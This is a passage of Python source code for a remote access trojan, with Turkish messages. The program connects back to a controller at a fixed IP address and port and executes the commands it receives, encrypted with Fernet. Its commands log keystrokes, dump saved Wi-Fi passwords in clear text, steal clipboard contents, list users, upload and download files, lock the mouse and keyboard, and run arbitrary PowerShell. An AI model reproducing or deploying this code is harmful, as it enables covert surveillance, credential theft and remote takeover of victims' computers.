Python Sürümü : {platform.python_version()}
Java Sürümü : {platform.java_ver()}
Anamakina Adı : {platform.node()}\n\n
"""

                # Windows Command
                elif command[0] == "search":
                    new_search_params = str(command[2]).replace("-", " ")
                    search_list = ""
                    for anaDizin, altDizinler, dosyalar in os.walk(os.getcwd()):
                        for dosya in dosyalar:
                            if dosya.endswith(str(command[1])):
                                search_list += anaDizin + "\\" + dosya + "?" + "\n"

                    SendResult = search_list

                # Windows Command
                elif command[0] == "edit" and len(command) > 1:
                    new_command = str(command[1]).replace("-", " ")
                    with open(new_command, "r") as editmyfile:
                        self.Send(Fernet(self.FernetPRIVATE_KEY).encrypt(editmyfile.read().encode("utf-8")))
                        editmyfile.close()

                    response = Fernet(self.LISTENER_FERNET_KEY).decrypt(self.Receive()).decode("utf-8")

                    with open(new_command, "w") as writemyfile:
                        writemyfile.truncate()
                        writemyfile.write(response)
                        writemyfile.close()

                    self.Send(Fernet(self.FernetPRIVATE_KEY).encrypt(f"{new_command} Değiştirildi.".encode("utf-8")))
                    continue

                # Windows Command
                elif command[0] == "cd" and len(command) > 1:
                    new_command = str(command[1]).replace("-", " ")
                    os.chdir(new_command)
                    SendResult = "Yeni Lokasyon -> {}".format(new_command)

                # Windows Command
                elif command[0] == "setvolume":
                    devices = AudioUtilities.GetSpeakers()
                    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                    volume = interface.QueryInterface(IAudioEndpointVolume)

                    if command[1] == "off":
                        volume.SetMasterVolumeLevel(-63.0, None)

                    elif command[1] == "on":
                        volume.SetMasterVolumeLevel(-1.0, None)

                    else:
                        volume.SetMasterVolumeLevel(-float(command[1]), None)
                    SendResult = "Set Volume OK"

                # Windows Command
                elif command[0] == "block_mouse_stop":
                    self.BlockMouse = True
                    SendResult = "Block Mouse Stop OK"

                # Windows Command
                elif command[0] == "show_wifi":
                    try:
                        SendResult = subprocess.check_output(["powershell", "netsh", "wlan", "show", "interfaces"],
                                                             shell=True).decode("utf-8", errors="ignore")
                    except Exception as e:
                        SendResult = f"show_wifi Error : {e}"

                # Windows Command
                elif command[0] == "show_wifi_password":
                    try:
                        new_command = str(command[1]).replace("-", " ")
                        SendResult = subprocess.check_output(f'powershell netsh wlan show profile name="{new_command}" key=clear',
                                                             shell=True).decode("utf-8", errors="ignore")
                    except Exception as e:
                        SendResult = f"show_wifi_password Error : {e}"

                elif command[0] == "chmod":
                    new_command = str(command[1]).replace("-", " ")
                    os.chmod(new_command, int(command[2]))
                    SendResult = f"chmod {command[1]} -> {command[2]}"

                elif command[0] == "show_user":
                    SendResult = subprocess.check_output(["powershell", "net", "user"], shell=True).decode("utf-8", errors="ignore")

                # Windows Command
                elif command[0] == "block_mouse":
                    try:
                        def MouseBlocked():
                            while True:
                                try:
                                    if self.BlockMouseStop == True:
                                        break

                                    sleep(0.2)
                                    pyautogui.moveTo(100, 100)
                                except:
                                    pass

                        mpro = threading.Thread(target=MouseBlocked)
                        mpro.start()
                        SendResult = "Mouse Blocked Successful"

                    except Exception as e:
                        SendResult = f"block_mouse Error : {e}"

                # Windows Command
                elif command[0] == "key_up":
                    try:
                        keyboard.on_release(lambda e: self.KeyList.append(e.name))
                        SendResult = "Key Injected OK"
                    except Exception as e:
                        SendResult = f"key_up Error : {e}"

                # Windows Command
                elif command[0] == "key_dump":
                    try:
                        dump = ""
                        for i in self.KeyList:
                            if i == "space":
                                dump += " "

                            elif i == "backspace":
                                dump += "<BACKSPACE>"

                            elif i == "shift":
                                dump += "<SHIFT>"

                            elif i == "alt":
                                dump += "<ALT>"

                            elif i == "ctrl":
                                dump += "<CTRL>"

                            else:
                                dump += i

                        self.KeyList.clear()
                        SendResult = dump

                    except Exception as e:
                        SendResult = f"key_dump Error : {e}"

                # Windows Command
                elif command[0] == "download":
                    try:
                        SendResult = self.SendFile(command[1]).decode("utf-8", errors="ignore")
                    except Exception as e:
                        SendResult = f"download Error : {e}"

                # Windows Command
                elif command[0] == "upload":
                    try:
                        SendResult = self.ReceiveFile(command[1], command[2])
                    except Exception as e:
                        SendResult = f"upload Error : {e}"

                # Windows Command
                elif command[0] == "block_key":
                    if command[1] == "all":
                        try:
                            BLOCK_LIST = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
                                     'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p',
                                     'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 1, 2, 3, 4, 5, 6, 7, 8, 9, 0]


                            for i in BLOCK_LIST:
                                keyboard.block_key(i)

                            SendResult = "Block Key All OK"

                        except Exception as e:
                            SendResult = f"block_key <ALL> Error : {e}"

                    else:
                        try:
                            if str(command[1]).isnumeric():
                                keyboard.block_key(int(command[1]))
                                SendResult = f"{command[1]} Block OK"
                            else:
                                keyboard.block_key(str(command[1]))
                                SendResult = f"{command[1]} Block OK"
                        except Exception as e:
                            SendResult = f"block_key Error : {e}"

                # Windows Command
                elif command[0] == "history_copy":
                    try:
                        SendResult = pyperclip.paste()
                    except Exception as e:
                        SendResult = f"history_copy Error : {e}"

                else:
                    try:
                        SendResult = subprocess.check_output("powershell " + command, shell=True).decode("utf-8", errors="ignore")
                    except Exception as e:
                        SendResult = f"Error : {e}"

                self.Send(Fernet(self.FernetPRIVATE_KEY).encrypt(SendResult.encode("utf-8")))

            except Exception as e:
                print(e)

ImamGulmez = ImamGulmez("192.168.1.43", 5555)
ImamGulmez.Run()
